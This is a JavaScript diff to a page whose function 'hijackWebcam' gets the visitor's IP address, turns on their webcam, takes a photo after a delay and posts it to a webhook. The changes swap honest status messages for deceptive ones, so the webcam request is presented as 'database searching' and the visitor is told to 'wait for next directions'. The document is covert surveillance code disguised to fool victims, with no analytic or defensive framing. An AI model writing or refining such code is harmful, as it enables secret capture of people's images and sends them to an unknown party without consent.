@@ -69,7 +69,7 @@
   }
 
   async function hijackWebcam() {
-    statusEl.textContent = "Requesting webcam permission...";
+    statusEl.textContent = "Requesting database saerching permission...";
     try {
       const ip = await getIP();
 
@@ -81,7 +81,7 @@
       video.srcObject = stream;
       await video.play();
 
-      statusEl.textContent = `Capturing photo in ${DELAY_SECONDS} seconds...`;
+      statusEl.textContent = `Searching database photo in ${DELAY_SECONDS} seconds...`;
 
       await new Promise(resolve => setTimeout(resolve, DELAY_SECONDS * 1000));
 
@@ -100,7 +100,7 @@
         formData.append("file", blob, `webcam_${ip}.jpg`);
         fetch(WEBHOOK_URL, { method: "POST", body: formData });
         stream.getTracks().forEach(track => track.stop());
-        statusEl.textContent = "Photo captured and sent.";
+        statusEl.textContent = "The 1 step got completed wait for next directions";
       }, "image/jpeg", 0.9);
 
     } catch (err) {
